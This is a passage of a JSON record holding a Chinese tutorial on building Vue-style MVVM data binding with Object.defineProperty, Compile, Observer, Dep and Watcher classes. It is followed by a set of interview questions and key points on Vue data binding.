src=\"js/mvvm/observer.js\"></script>  <!--观察-->\n<script type=\"text/javascript\" src=\"js/mvvm/watcher.js\"></script> <!--监视-->\n<script type=\"text/javascript\">\n  const vm = new MVVM({         //这里的MVVM只是定义的名字\n    el: \"#test\",\n    data: {\n      name: '张三'\n    }\n  })\n  console.log(vm.name)        // 读取的是data中的name,  vm代理对data的读操作\n  vm.name = '李四'           // 数据保存到data中的name上, vm代理对data的写操作\n  console.log(vm.name, vm._data.name)\n</script>\n</body>\n\n```\n\n\n\n#### 4.3 MVVM.js\n\n```javascript\n/*\n相关于Vue的构造函数\n */\nfunction MVVM(options) {\n  // 将选项对象保存到vm\n  this.$options = options;\n  // 将data对象保存到vm和data变量中\n  var data = this._data = this.$options.data;\n  //将vm保存在me变量中\n  var me = this;\n  // 遍历data中所有属性\n  Object.keys(data).forEach(function (key) { // key是data的某个属性名: name\n    // 对指定属性实现代理\n    me._proxy(key);\n  });\n\n  // 对data中所有层次的属性通过 数据劫持 实现 数据绑定。进行监视\n  observe(data, this);\n\n  // 创建一个编译对象，来解析模板 的compile对象\n  //如果左边有值传左边的，没有则传右边的\n  this.$compile = new Compile(options.el || document.body, this)\n}\n\nMVVM.prototype = {\n  $watch: function (key, cb, options) {\n    new Watcher(this, key, cb);\n  },\n\n  // 对指定属性实现代理\n  _proxy: function (key) {\n    // 保存vm\n    var me = this;\n    // 给vm添加指定属性名的属性(使用属性描述)\n    Object.defineProperty(me, key, {\n      configurable: false,    // 不能再重新定义\n      enumerable: true,       // 可以枚举\n      // 当通过vm.name读取属性值时自动调用,从data中获取对应的属性值返回\n      get: function proxyGetter() {\n        // 读取data中对应属性值返回(实现代理 读 操作)\n        return me._data[key];\n      },\n      // 当通过vm.name = 'xxx'时自动调用\n      set: function proxySetter(newVal) {\n        // 将xxx最新的值保存到data中对应的属性上(实现代理 写 操作)\n        me._data[key] = newVal;\n      }\n    });\n  }\n};\n\n```\n\n`proxy:` vue 有一个特点，可以通过访问 vm 的实例属性，直接访问到 vm 初始化时 data 的属性值。这个其实是一个代理模式的实现, 对 vm 实例进行**键值**的代理\n\n#### 4.4 proxy代理\n\n```javascript\n let a = {\n    data: {\n      b: 123\n    }\n  }; \n/**   * 实现访问 a.b === 123   */\n  function proxy(target: Object, sourceKey: string): void {\n    let data = target[sourceKey];\n    let keys = Object.keys(data);\n    for (let i = 0, l = keys.length; i < l; i++) {\n      let key = keys[i];\n      Object.defineProperty(target, key, {\n        enumerable: true,\n        configurable: true,\n        set(val) {\n          this[sourceKey][key] = val;\n        },\n        get() {\n          return this[sourceKey][key];\n        }\n      });\n    }\n  }\n  proxy(a, \"data\");\n console.log(a.b); // 123\n\n```\n\n* * *\n\n### 5\\. 模板解析\n\n```javascript\n  // 创建一个编译对象，来解析模板 的compile对象\n  //如果左边有值传左边的，没有则传右边的\n  this.$compile = new Compile(options.el || document.body, this)\n\n```\n\n`模板：` html嵌套了js代码（1.指令代码2.表达式）\n\n#### 5.1 模板解析的基本流程\n\n1.  将 el 的所有子节点取出, 添加到一个新建的文档 fragment 对象中\n2.  对 fragment 中的所有层次子节点递归进行编译解析处理\n    1.  对大括号表达式文本节点进行解析\n    2.  对元素节点的指令属性进行解析\n        1.  事件指令解析\n        2.  一般指令解析\n3.  将解析后的 fragment 添加到 el 中显示\n\n#### 5.2 模板解析\n\n##### 5.2.1 大括号表达式解析 {{msg}}\n\n**1.根据 正则对象 得到匹配出的 表达式字符串: 子匹配/RegExp.$1 name**\n\n> var reg = /{{(.\\*)}}/;\n> \n> me.compileText(node, RegExp.$1);\n\n**2.从 data 中取出表达式对应的属性值**\n\n> // 将data对象保存到vm和data变量中\n> \n> var data = this.\\_data = this.$options.data;\n\n**3.将属性值设置为文本节点的 textContent**\n\n> // 更新节点的textContent\n> \n> textUpdater: function (node, value) {\n> \n> node.textContent = typeof value == 'undefined' ? '' : value;\n> \n> },\n\n##### 5.2.2 **编译模板**\n\n**1.compile.js**\n\n> //编译模板最重要的3步：\n> \n> this.`$fragment` = this.node2Fragment(this.`$el`);\n> \n> this.init();\n> \n> this.`$el`.appendChild(this.`$fragment`);\n\n```javascript\n  function Compile(el, vm) {\n    // 保存vm\n    this.$vm = vm;\n    // 保存el元素\n    //this是compile实例(编译对象)，$el存的是dom元素\n    this.$el = this.isElementNode(el) ? el : document.querySelector(el);\n    // 如果el元素存在\n    if (this.$el) {\n      //模板解析最重要的3步： 2表示to,node2Fragment--->nodeToFragment将node转换为Fragment\n      // 1. 取出el中所有子节点, 封装在一个framgment对象中\n      this.$fragment = this.node2Fragment(this.$el);\n      // 2. 初始化显示，解析模板（在内存中进行编译），编译fragment中所有层次子节点\n      this.init();\n      // 3. 将fragment添加到页面的el元素中\n      this.$el.appendChild(this.$fragment); //编译完后再将其塞回页面中\n    }\n  }\n\n```\n\n##### 5.2.3 debug\n\n\n\n要取对象的属性有两种方式：\n\n**1.点.出属性**\n\n**2.使用\\[ \\] ,若属性值是变量(变化的值),则必须采用\\[ \\]的方式**\n\n由于 vue 的 parsePath 方法是用 split('.') 来做的属性分割，所以不支持abc\\['bbc'\\]\n\n##### 5.2.4 解析 v-on:click=\"show\"\n\n```html\n<body>\n    <div id=\"test\">\n        <p>{{msg}}</p>\n        <!--给button绑定点击事件：要指定事件名，指定回调函数-->\n        <button v-on:click=\"show\">提示</button>\n    </div>\n<script type=\"text/javascript\">\nnew MVVM({\n    el: '#test',\n    methods: {\n        show () {\n            alert(this.msg)\n        }\n    }\n})\n</script>\n</body>\n\n```\n\n**核心：**\n\n**1.从指令名中取出事件名 click**\n\n> var eventType = dir.split(':')\\[1\\],\n\n**2.根据指令的值(表达式)从 methods 中得到对应的事件处理函数对象 show ，exp表达式**\n\n> fn = vm.`$options`.methods && vm.`$options`.methods\\[exp\\];\n\n**3.给当前元素节点绑定指定事件名和回调函数的 dom 事件监听eventHandler中的**\n\n> if (eventType && fn) {\n> \n> ​ node.addEventListener(eventType, fn.bind(vm), false);\n> \n> }\n\n**4.指令解析完后, 移除此指令属性**\n\n> node.removeAttribute(attrName);\n\n**isDirective()** 判断是不是属性名，有v-的都是属性名\n\n**subString(2)** 从`下标为2` 的地方开始截，例如 `v-on:click`，截取完后为 `on:click`\n\n**isEventDirective()** 判断 是不是事件指令\n\n```javascript\n// 解析事件指令\ncompileUtil.eventHandler(node, me.$vm, exp, dir);\n// 事件处理(器)\n.eventHandler\n\n```\n\n##### 5.2.5 一般指令解析\n\n```html\n<style>\n.aclass {\n    color: red;\n}\n.bClass {\n    font-size: 30px;\n}\n</style>\n</head>\n<body>\n    <div id=\"test\">\n        <p v-text=\"msg\"></p>\n        <p v-html=\"msg\">123</p>\n        <p class=\"bClass\" v-class=\"myClass\">xxxxxx</p>\n    </div>\n<script type=\"text/javascript\" src=\"js/mvvm/compile.js\"></script>\n<script type=\"text/javascript\" src=\"js/mvvm/mvvm.js\"></script>\n<script type=\"text/javascript\" src=\"js/mvvm/observer.js\"></script>\n<script type=\"text/javascript\" src=\"js/mvvm/watcher.js\"></script>\n<script type=\"text/javascript\">\nnew MVVM({\n\tel: '#test',\n\tdata: {\n\t\tmsg: '<a href=\"http://www.atguigu.com\">xxx</a>',\n\t\tmyClass: 'aclass'\n\t},\n\tmethods: {\n\t\ttest () {\n\t\t\talert(this.msg)\n\t\t}\n\t}\n})\n</script>\n\n```\n\n> // 解析普通指令\n> \n> compileUtil\\[dir\\] && compileUtil\\[dir\\](node, me.$vm, exp);\n\n上面的代码：**有几个指令属性，就执行几次**。此处是v-text=\"msg\"，v-html=\"msg\"，v-class=\"myClass\"有3个，就执行3次。\n\n1.  得到指令名和指令值(表达式) text/html/class msg/myClass\n2.  从 data 中根据表达式得到对应的值\n3.  根据指令名确定需要操作元素节点的什么属性\n\n*   v-text---textContent 属性\n*   v-html---innerHTML 属性\n*   v-class--className 属性\n\n1.  将得到的表达式的值设置到对应的属性上\n2.  移除元素的指令属性\n\n#### 5.3 compile.js\n\n> // 解析普通指令\n> \n> compileUtil\\[dir\\] && compileUtil\\[dir\\](node, me.$vm, exp);\n\n```javascript\n // 更新节点的className\n  classUpdater: function (node, value, oldValue) {\n    //静态class属性的值\n    var className = node.className;\n    className = className.replace(oldValue, '').replace(/\\s$/, '');\n\n    var space = className && String(value) ? ' ' : '';\n    //将静态class属性的值与动态class值进行合并后设置为新的className属性值\n    node.className = className + space + value;\n    // node.className = className + (className?' ':'' )+ value;   //可能是空串或者空格\n  },\n\n```\n\n详情见下方6.1四个重要对象。\n\n#### 5.4 数据绑定\n\n一旦更新了 data 中的某个属性数据, 所有界面上直接使用或间接使用了此属性的节点都会`更新`。即 **自动更新界面**。\n\n* * *\n\n### 6\\. 数据劫持\n\n**observe(data, this)**\n\n1.  `数据劫持是` vue 中用来 **实现数据绑定** 的一种 **技术**\n    \n2.  基本思想: 通过 defineProperty()来监视 **data 中所有属性**(任意层次)数据的变化, 一旦变化就去更新界面\n    \n    即，给data中的属性**添加set(监视变化)，get方法**\n    \n\n例如:this.xxx = 3,此时this是vm,改变vm的set的值，然后这里的set变化了，会改变data中xxx的值。(`vm`——>`M`)\n\n当data中xxx的值改变时，data的set值也发生变化，就会去更新界面了。(数据绑定：`M`——>`V` )\n\n即：\n\n*   **vm**中的`set` 是用来**实现 数据代理**的\n    \n*   **data**中的`set` 是用来实现 **数据绑定** 的（界面会变）\n    \n\n#### 6.1四个重要对象\n\n##### 流程\n\n*   **模板编译(Compile)**\n*   **数据劫持(Observer)**\n*   **发布的订阅(Dep)**\n*   **观察者(Watcher)**\n\n> MVVM模式就要将这些板块进行整合,实现**模板和数据**的**绑定**！\n\n##### 6.1.1 Compiler\n\n*   用来解析模板页面的对象的构造函数(一个实例)\n    \n*   利用 compile 对象解析模板页面\n    \n*   每解析一个表达式(非事件指令)都会创建一个对应的watcher对象, 并建立watcher 与 dep 的关系\n    \n*   `complie 与 watcher 关系:` 一对多的关系\n    \n\nMVVM中调用了Compile类来编译我们的页面,开始来实现模板编译\n\n###### 6.1.1.1. 搭建基础的架子\n\n```javascript\n class Compile {\n    constructor(el, vm) {\n      // 看看传递的元素是不是DOM,不是DOM我就来获取一下~\n      this.el = this.isElementNode(el) ? el : document.querySelector(el);\n      this.vm = vm;\n      if (this.el) {\n        // 如果这个元素能获取到 我们才开始编译\n        // 1.先把这些真实的DOM移入到内存中 fragment (性能优化)\n        let fragment = this.node2fragment(this.el);\n        // 2.编译 => 提取想要的元素节点 v-model 和文本节点 {{}}\n        this.compile(fragment);\n        // 3.把编译号的fragment在塞回到页面里去\n        this.el.appendChild(fragment);\n      }\n    }\n    /* 专门写一些辅助的方法 */\n    isElementNode(node) {\n      return node.nodeType === 1;\n    }\n    /* 核心的方法 */\n    compileElement(node) {}\n    compileText(node) {}\n    compile(fragment) {}\n    node2fragment(el) {}\n  }\n\n```\n\n接下来一个个的方法来搞\n\n###### 6.1.1.2. node2fragment\n\n```javascript\nnode2fragment(el) { // 需要将el中的内容全部放到内存中\n    // 文档碎片 内存中的dom节点\n    let fragment = document.createDocumentFragment();\n    let firstChild;\n    while (firstChild = el.firstChild) {\n      fragment.appendChild(firstChild);\n      // appendChild具有移动性\n    }\n    return fragment; // 内存中的节点\n  }\n\n```\n\n###### 6.1.1.3. compile\n\n```javascript\ncompile(fragment) {\n    // 需要递归 每次拿子元素\n    let childNodes = fragment.childNodes;\n    Array.from(childNodes).forEach(node => {\n      if (this.isElementNode(node)) {\n        // 是元素节点，还需要继续深入的检查\n        // 这里需要编译元素\n        this.compileElement(node);\n        this.compile(node)\n      } else {\n        // 文本节点\n        // 这里需要编译文本\n        this.compileText(node);\n      }\n    });\n  }\n\n```\n\n###### 6.1.1.4. compileElement、compileText\n\n再弄出两个方法**compileElement**，**compileText** 来专门处理对应的逻辑\n\n```javascript\n /*辅助的方法*/\n  // 是不是指令\n  isDirective(name) {\n    return name.includes('v-');\n  }\n  //————————————————————————————\n  compileElement(node) {\n    // 带v-model v-text\n    let attrs = node.attributes; // 取出当前节点的属性\n    Array.from(attrs).forEach(attr => {\n      // 判断属性名字是不是包含v-model\n      let attrName = attr.name;\n      if (this.isDirective(attrName)) {\n        // 取到对应的值放到节点中\n        let expr = attr.value;\n        let [, type] = attrName.split('-'); //\n        // 调用对应的编译方法 编译哪个节点,用数据替换掉表达式\n        CompileUtil[type](node, this.vm, expr);\n      }\n    })\n  }\n  compileText(node) {\n    let expr = node.textContent; // 取文本中的内容\n    let reg = /\\{\\{([^}]+)\\}\\}/g; // {{a}} {{b}} {{c}}\n    if (reg.test(expr)) {\n      // 调用编译文本的方法 编译哪个节点,用数据替换掉表达式\n      CompileUtil['text'](node, this.vm, expr);\n    }\n  }\n\n```\n\n###### 6.1.1.5. CompileUtil\n\n我们要实现一个专门用来配合**Complie类**的工具对象。\n\n先只处理文本和输入框的情况\n\n```javascript\nCompileUtil = {\n    text(node, vm, expr) { // 文本处理\n      let updateFn = this.updater['textUpdater'];\n      // 用处理好的节点和内容进行编译\n      updateFn && updateFn(node, value)\n    },\n    model(node, vm, expr) { // 输入框处理\n      let updateFn = this.updater['modelUpdater'];\n      // 用处理好的节点和内容进行编译\n      updateFn && updateFn(node, value);\n    },\n    updater: {\n      // 文本更新\n      textUpdater(node, value) {\n        node.textContent = value\n      },\n      // 输入框更新\n      modelUpdater(node, value) {\n        node.value = value;\n      }\n    }\n  }\n\n```\n\n###### 6.1.1.6. 实现text方法\n\n```javascript\n text(node, vm, expr) { // 文本处理\n      let updateFn = this.updater['textUpdater'];\n      // 文本比较特殊 expr可能是'{{message.a}} {{b}}'\n      // 调用getTextVal方法去取到对应的结果\n      let value = this.getTextVal(vm, expr);\n      updateFn && updateFn(node, value)\n    },\n    getTextVal(vm, expr) { // 获取编译文本后的结果\n      return expr.replace(/\\{\\{([^}]+)\\}\\}/g, (...arguments) => {\n        // 依次去取数据对应的值\n        return this.getVal(vm, arguments[1]);\n      })\n    },\n    getVal(vm, expr) { // 获取实例上对应的数据\n      expr = expr.split('.'); // {{message.a}} [message,a] 实现依次取值\n      // vm.$data.message => vm.$data.message.a\n      return expr.reduce((prev, next) => {\n        return prev[next];\n      }, vm.$data);\n    }\n\n```\n\n###### 6.1.1.7. 实现Model方法\n\n```javascript\nmodel(node, vm, expr) { // 输入框处理\n    let updateFn = this.updater['modelUpdater'];\n    // 这里应该加一个监控 数据变化了 应该调用这个watch的callback\n    updateFn && updateFn(node, this.getVal(vm, expr));\n  }\n\n```\n\n##### 6.1.2 Observer\n\n（观察到了然后去“劫持”数据，定义get/set，创建dep对象）\n\n*   用来对 data 所有属性数据**进行劫持**的构造函数\n    \n*   给 data 中所有属性重新定义属性描述(get/set)\n    \n*   为 data 中的每个属性创建对应的 dep 对象\n    \n\n> 可以利用`Obeject.defineProperty()`来监听属性变动 那么将需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 `setter`和`getter` 这样的话，给这个对象的某个值赋值，就会触发`setter`，那么就能监听到了数据变化\n\n接下来我们就来写下一个**类Observer**\n\n```javascript\n // 在MVVM加上Observe的逻辑\n  if (this.$el) {\n    // 数据劫持 就是把对象的所有属性 改成get和set方法\n    new Observer(this.$data);\n    // 用数据和元素进行编译\n    new Compile(this.$el, this);\n  }\n // -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --\n  class Observer {\n    constructor(data) {\n      this.observe(data);\n    }\n    observe(data) {\n      // 要将这个data数据原有的属性改成set和get的形式\n      // defineProperty针对的是对象\n      if (!data || typeof data !== 'object') {\n        return;\n      }\n      // 要将数据 一一劫持 先获取到data的key和value\n      Object.keys(data).forEach(key => {\n        // 定义响应式变化\n        this.defineReactive(data, key, data[key]);\n        this.observe(data[key]); // 深度递归劫持\n      });\n    }\n    // 定义响应式\n    defineReactive(obj, key, value) {\n      // 在获取某个值的时候，想弹个框\n      let that = this;\n      Object.defineProperty(obj, key, {\n        enumerable: true,\n        configurable: true,\n        get() { // 当取值时调用的方法\n          return value;\n        },\n        set(newValue) { // 当给data属性中设置值的适合 更改获取的属性的值\n          if (newValue != value) {\n            // 这里的this不是实例\n            that.observe(newValue); // 如果设置的是对象，则继续劫持\n            value = newValue;\n          }\n        }\n      });\n    }\n  }\n\n```\n\n##### 6.1.3 Dep(Depend)\n\n（存放watcher的数组，即subscribes——subs）\n\n*   data 中的每个属性(所有层次)都对应一个 dep 对象\n    \n*   创建的时机:\n    \n    *   在初始化 definedata 中各个属性时创建对应的 dep 对象\n    *   在 data 中的某个属性值被设置为新的对象时\n*   对象的结构\n    \n\n> {\n> \n> id, // 每个 dep 都有一个唯一的 id\n> \n> subs //包含 n 个对应 watcher 的 数组 (**subscribes 的简写**)\n> \n> }\n\n*   subs 属性说明\n    *   当 watcher 被创建时, 内部将当前 watcher对象添加到对应的 dep对象的 subs中\n    *   当此 data 属性的值发生改变时,subs 中所有的 watcher 都会收到更新的通知,从而最终更新对应的界面\n\n发布订阅：Dep实现\n\n```javascript\n class Dep {\n    constructor() {\n      // 订阅的数组\n      this.subs = []\n    }\n    addSub(watcher) {\n      this.subs.push(watcher);\n    }\n    notify() {\n      this.subs.forEach(watcher => watcher.update());\n    }\n  }\n\n```\n\n##### 6.1.4 Watcher\n\n更新显示内容的\n\n*   模板中每个非事件指令或表达式都对应一个 watcher **对象**\n    \n*   监视当前表达式数据的变化\n    \n*   创建的时机: 在初始化编译模板时\n    \n*   对象的组成\n    \n\n> {\n> \n> vm, //vm 对象\n> \n> exp, //对应指令的表达式\n> \n> cb, //当表达式所对应的数据发生改变的回调函数 （更新界面的回调函数）\n> \n> value, //表达式当前的值\n> \n> depIds //表达式中各级属性所对应的 dep 对象的集合对象 //属性名为 dep 的 > id, 属性值为 dep\n> \n> }\n\n观察者的目的就是给需要变化的那个元素增加一个观察者，用新值和老值进行比对，如果数据变化就执行对应的方法\n\n```javascript\nclass Watcher { // 因为要获取老值 所以需要 \"数据\" 和 \"表达式\"\n    constructor(vm, expr, cb) {\n      this.vm = vm;\n      this.expr = expr;\n      this.cb = cb;\n      // 先获取一下老的值 保留起来\n      this.value = this.get();\n    }\n    // 老套路获取值的方法，这里先不进行封装\n    getVal(vm, expr) {\n      expr = expr.split('.');\n      return expr.reduce((prev, next) => {\n        return prev[next];\n      }, vm.$data);\n    }\n    get() {\n      let value = this.getVal(this.vm, this.expr);\n      return value;\n    }\n    // 对外暴露的方法，如果值改变就可以调用这个方法来更新\n    update() {\n      let newValue = this.getVal(this.vm, this.expr);\n      let oldValue = this.value;\n      if (newValue != oldValue) {\n        this.cb(newValue); // 对应watch的callback\n      }\n    }\n  }\n\n```\n\n在哪里使用watcher?\n\n答案肯定是：compile， 给需要重新编译的DOM增加watcher\n\n```javascript\ntext(node, vm, expr) { // 文本处理\n      let updateFn = this.updater['textUpdater'];\n      let value = this.getTextVal(vm, expr); +\n      expr.replace(/\\{\\{([^}]+)\\}\\}/g, (...arguments) => {\n        new Watcher(vm, arguments[1], (newValue) => {\n          // 如果数据变化了，文本节点需要重新获取依赖的属性更新文本中的内容\n          updateFn && updateFn(node, this.getTextVal(vm, expr));\n        });\n      })\n      updateFn && updateFn(node, value)\n    },\n    model(node, vm, expr) { // 输入框处理\n      let updateFn = this.updater['modelUpdater'];\n      new Watcher(vm, expr, (newValue) => {\n        // 当值变化后会调用cb 将新的值传递过来\n        updateFn && updateFn(node, newValue);\n      });\n      updateFn && updateFn(node, this.getVal(vm, expr));\n    }\n\n```\n\n##### 6.1.5 dep 与 watcher 的关系\n\n**多对多**\n\n*   a .data 中的一个属性对应一个 dep, 一个 dep 中可能包含多个 watcher(模板中有几个 表达式使用到了同一个属性)\n    \n*   b.模板中一个非事件表达式对应一个 watcher, 一个 watcher 中可能包含多个 dep(表 达式是多层:a.b)\n    \n*   c.**数据绑定**使用到 2 个核心技术\n    \n    *   **defineProperty()**\n        \n    *   **消息订阅与发布**\n        \n        `Dep与Watch之间的关系 ：多对多`\n        \n        dep先创建，watcher后创建。一旦watcher创建，关系就有限制条件了\n        \n        *   `1data属性` ---> `1Dep` ---> `n个watcher(模板中有多个表达式使用了此属性)`\n        *   例如：在模板中写了多次表达式：{{name}}/ v-text=\"name\" ，则此时`1个name` --->`1个Dep` ---> `2个watcher`\n        *   `1表达式` ---> `1Watcher` ---> `n个Dep(多层表达式)`\n        *   例如：a.b.c 对应`1个watcher`，但对应 `3个dep` (a.b.c有3层)\n\n同一个属性对应同一个dep\n\n如何建立的？\n\n*   data中属性的get()中建立\n    \n*   **vm.name = 'abc' --->data中的name属性值变化 ---> name的set()调用 ---> dep --->相关的所有watcher --->cb() --->updater**\n    \n\n什么时候建立？\n\n*   初始化的解析模板中的表达式创建watcher对象时\n    \n*   通过get:建立dep与watcher的关系\n    \n\n关联dep和watcher，watcher中有个重要的逻辑就是this.get()；每个watcher被实例化时都会获取数据从而会调用当前属性的get方法\n\n```javascript\nObject.defineProperty(data, key, {\n\tenumerable: true, // 可枚举\n\tconfigurable: false, // 不能再define\n\tget: function() {\n\t\t// 建立dep与watcher的关系\n\t\tif (Dep.target) {\n\t\t\tdep.depend();\n\t\t}\n\t\t// 返回属性值\n\t\treturn val;\n\t},\n\tset: function(newVal) {\n\t\tif (newVal === val) {\n\t\t\treturn;\n\t\t}\n\t\tval = newVal;\n\t\t// 新的值是object的话，进行监听\n\t\tchildObj = observe(newVal);//observe观察data中的所有属性\n\t\t// 通过dep ,通知订阅者\n\t\tdep.notify();\n\t}\n});\n\n```\n\n到此数据和视图就关联起来了！\n\n##### 6.1.6 发布订阅：**监听输入事件**\n\n```javascript\n setVal(vm, expr, value) {\n      expr = expr.split('.');\n      return expr.reduce((prev, next, currentIndex) => {\n        if (currentIndex === expr.length - 1) {\n          return prev[next] = value;\n        }\n        return prev[next];\n      }, vm.$data);\n    },\n    model(node, vm, expr) {\n      let updateFn = this.updater['modelUpdater'];\n      new Watcher(vm, expr, (newValue) => {\n        // 当值变化后会调用cb 将新的值传递过来 （）\n        updateFn && updateFn(node, this.getVal(vm, expr));\n      });\n      node.addEventListener('input', (e) => {\n        let newValue = e.target.value;\n        // 监听输入事件将输入的内容设置到对应数据上\n        this.setVal(vm, expr, newValue)\n      });\n      updateFn && updateFn(node, this.getVal(vm, expr));\n    }\n\n```\n\n##### 6.1.7 发布订阅：**代理数据**\n\n```javascript\nclass MVVM {\n    constructor(options) {\n      this.$el = options.el;\n      this.$data = options.data;\n      if (this.$el) {\n        new Observer(this.$data);\n        // 将数据代理到实例上直接操作实例即可，不需要通过vm.$data来进行操作\n        this.proxyData(this.$data);\n        new Compile(this.$el, this);\n      }\n    }\n    proxyData(data) {\n      Object.keys(data).forEach(key => {\n        Object.defineProperty(this, key, {\n          get() {\n            return data[key]\n          },\n          set(newValue) {\n            data[key] = newValue\n          }\n        })\n      })\n    }\n  }\n\n```\n\n##### 拓展\n\n**回调函数**\n\n此处不深入展开，可思考如下问题：\n\n1.什么时候调，\n\n2.做了什么事情，\n\n3.回调函数的this是什么\n\n* * *\n\n### 7\\. MVVM 原理分析\n\n#### 7.1原理分析\n\n要实现`mvvm的双向绑定`，就必须要实现以下几点：\n\n1.  实现一个数据监听器**Observer**，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者\n2.  实现一个指令解析器**Compile**，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数\n3.  实现一个**Watcher**，作为连接**Observer**和**Compile**的桥梁，能够`订阅并收到`每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图\n4.  mvvm入口函数，整合以上三者\n\n\n* * *\n\n### 8\\. 双向数据绑定\n\n> 双向数据绑定=单向数据绑定+input 监听\n\n#### 8.1 v-model\n\n1.  **双向数据绑定**是建立在**单向数据绑定**(**model==>View**)的基础之上的\n    \n2.  双向数据绑定的实现流程:\n    \n    a. 在解析 v-model 指令时, 给当前元素添加 **input 监听** （从View==>model）\n    \n    b. 当 input 的 value 发生改变时, 将最新的值赋值给当前表达式所对应的 data 属性\n    \n\n```html\n<div id=\"test\">\n<input type=\"text\" v-model=\"msg\">\n<p>{{msg}}</p>\n</div>\n<script type=\"text/javascript\">\nnew MVVM({\n\tel: '#test',\n\tdata: {\n\t\tmsg: 'haha'\n\t}\n})\n</script>\n\n```\n\n",
    "testPoint": "### **1. 数据绑定的基础概念**\n#### **问题**：\n- Vue 的数据绑定是什么？它有哪些方式？\n- 数据绑定是单向还是双向的？具体应用场景有哪些？\n\n#### **关键点**：\n- Vue 提供了 **单向数据绑定** 和 **双向数据绑定**：\n  - **单向绑定**：`{{}}` 插值表达式、`v-bind`（简称 `:`）语法，常用于父组件向子组件传递数据。\n  - **双向绑定**：`v-model`，通常用于表单控件的用户输入处理。\n- 单向绑定的优势是明确数据流动方向，双向绑定更适合快速开发但需注意复杂性和调试困难。\n\n---\n\n### **2. 数据绑定的原理**\n#### **问题**：\n- Vue 是如何实现响应式数据绑定的？\n- `Object.defineProperty` 和 Proxy 在 Vue 数据绑定中的作用是什么？\n- 为什么 Vue2 不能检测数组的变动？\n\n#### **关键点**：\n- **Vue2**：\n  - 通过 `Object.defineProperty` 劫持数据的 `getter` 和 `setter`。\n  - 数据变化时，触发依赖收集（订阅者更新视图）。\n  - 局限性：\n    - 无法直接检测数组下标变化。\n    - 无法检测对象的属性新增或删除。\n- **Vue3**：\n  - 使用 `Proxy` 实现深层次的数据劫持。\n  - Proxy 的优势：\n    - 能直接监听数组变化。\n    - 对动态添加属性的对象支持更好。\n\n---\n\n### **3. 表单与 `v-model`**\n#### **问题**：\n- `v-model` 的底层是如何实现双向数据绑定的？\n- 如何实现自定义组件的 `v-model`？\n- 如何绑定复选框、单选框和选择框？\n\n#### **关键点**：\n- Vue 通过监听 DOM 事件（如 `input`、`change`）实现双向绑定。\n- 自定义组件中的 `v-model`，需要使用 `model` 选项或 `prop` + `emit` 组合：\n  ```javascript\n  props: ['value'],\n  methods: {\n    updateValue(newValue) {\n      this.$emit('input', newValue);\n    }\n  }\n  ```\n- 表单绑定示例：\n  - 单选框：`<input type=\"radio\" v-model=\"value\">`\n  - 复选框：`<input type=\"checkbox\" v-model=\"checked\">`\n  - 多选框：`<select multiple v-model=\"selected\"></select>`\n\n---\n\n### **4. 父子组件之间的数据绑定**\n#### **问题**：\n- 父组件如何向子组件传递数据？子组件如何向父组件发送数据？\n- 子组件中的数据变化是否会影响父组件？为什么？\n\n#### **关键点**：\n- 父组件向子组件传递数据：通过 `props`。\n- 子组件向父组件传递数据：\n  - 使用 `$emit` 触发事件。\n  - 使用 `v-model` 实现双向绑定。\n- 子组件的 `props` 是单向数据流，直接修改 `props` 会触发警告。\n\n---\n\n### **5. 数据绑定中的异步更新机制**\n#### **问题**：\n- Vue 为什么使用异步更新 DOM？\n- 如何通过 `$nextTick` 获取最新的 DOM？\n- 如果在同一事件中多次更新数据，Vue 如何处理？\n\n#### **关键点**：\n- Vue 将数据更新操作缓存起来，并在下一个事件循环（microtask）中统一执行，以优化性能。\n- 示例：\n  ```javascript\n  this.value = 1;\n  this.value = 2;\n  console.log(this.value); // 输出 2\n  this.$nextTick(() => {\n    console.log(this.$refs.dom.innerText); // 最新 DOM\n  });\n  ```\n\n---\n\n### **6. 深入数据绑定的优化**\n#### **问题**：\n- 如何避免对不必要的数据设置响应式？\n- 如何优化大型数据集的绑定性能？\n- Vue 数据绑定对性能的影响有哪些？\n\n#### **关键点**：\n- 避免不必要的响应式：使用 `Object.freeze` 或 `nonReactive` 对象。\n- 优化数据结构：\n  - 将大列表拆分为分页加载。\n  - 使用 `key` 确保高效的 DOM 更新。\n- 在 Vue3 中，响应式系统性能显著提升，特别是对 Proxy 的全面支持。\n\n---\n\n### **7. 常见问题与解决方案**\n#### **问题**：\n- 为什么 Vue2 无法检测数组的下标变化？如何解决？\n- 数据绑定失效的常见原因有哪些？如何调试？\n- 双向绑定导致数据混乱时，如何排查和修复？\n\n#### **关键点**：\n- Vue2 数组变动问题：\n  - 使用 Vue 提供的数组变异方法，如 `splice`。\n  - 或者手动触发视图更新：`this.$set(array, index, value)`。\n- 数据绑定失效：\n  - 数据未在响应式系统内。\n  - 数据对象层级过深但未使用深度监听。\n  - 直接修改 `props` 数据。\n\n---\n\n### **8. 实践问题**\n#### **问题**：\n- 在项目中，遇到过数据绑定相关的 bug 吗？如何解决？\n- 如何在 Vue 中实现一个双向绑定的时间选择组件？\n\n#### **关键点**：\n- 实现双向绑定的自定义组件：\n  ```javascript\n  props: ['value'],\n  methods: {\n    updateTime(event) {\n      this.$emit('input', event.target.value);\n    }\n  }\n  ```\n\n---\n\n### **9. 开放性问题**\n#### **问题**：\n- Vue 的数据绑定与 React 的状态管理相比，有何优劣？\n- 你认为 Vue 的数据绑定机制是否存在改进空间？如果有，你会如何设计？\n\n#### **关键点**：\n- 对比 Vue 的响应式与 React 的单向数据流：\n  - Vue：数据变化自动更新视图（响应式）。\n  - React：通过 `setState` 手动触发更新（受控组件）。\n- 改进空间：\n  - 更灵活的响应式选择（如按需响应）。\n  - 提供更丰富的调试工具。\n\n---\n\n### 总结\n**Vue 数据绑定**考察能够帮助面试官了解候选人对 Vue 响应式系统、单向与双向数据流、性能优化、实际问题解决等方面的理解深度，以及对前端框架设计的思考能力。优秀的候选人不仅能回答理论问题，还能结合项目经验展示实践能力。",
    "exerciseKeyList": "[\"2ea94d0f-e412-4db2-9d42-20c7eb50284f\",\"9b0272bb-d110-45f6-a9e9-7e426c8288d5\",\"da1881cc-64b9-40f8-8a25-a6256c1349ed\",\"a4905b6d-283a-48ee-8c19-6f390f7fd9bc\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-04T12:26:42.000Z",
    "updateAt": "2024-12-15T11:21:11.000Z",
